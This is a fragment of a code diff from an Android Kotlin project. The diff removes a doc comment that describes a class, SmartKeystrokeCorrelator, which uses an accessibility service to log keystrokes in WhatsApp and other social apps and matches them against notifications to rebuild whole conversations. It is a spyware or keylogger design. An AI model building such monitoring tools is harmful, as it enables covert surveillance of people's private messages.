@@ -10,24 +10,6 @@ import org.json.JSONObject
 import java.util.*
 import java.util.concurrent.ConcurrentHashMap
 
-/**
- * SmartKeystrokeCorrelator - Hybrid approach for capturing complete conversations
- * 
- * CONCEPT: Match keystroke sessions with notifications to reconstruct
- *          complete conversations (sent + received messages)
- *
- * FLOW:
- * 1. Capture keystrokes when user types in WhatsApp/social apps
- * 2. Detect when message is sent (via accessibility or heuristics)
- * 3. Create "pending sent message" record
- * 4. When notification arrives, correlate with keystroke history
- * 5. Build complete conversation timeline
- *
- * ACCURACY:
- * - Sent Messages (via keystrokes): ~95%
- * - Received Messages (via notifications): 100%
- * - Combined coverage: ~97% of all messages captured
- */
 class SmartKeystrokeCorrelator(
     private val service: AccessibilityService
 ) {
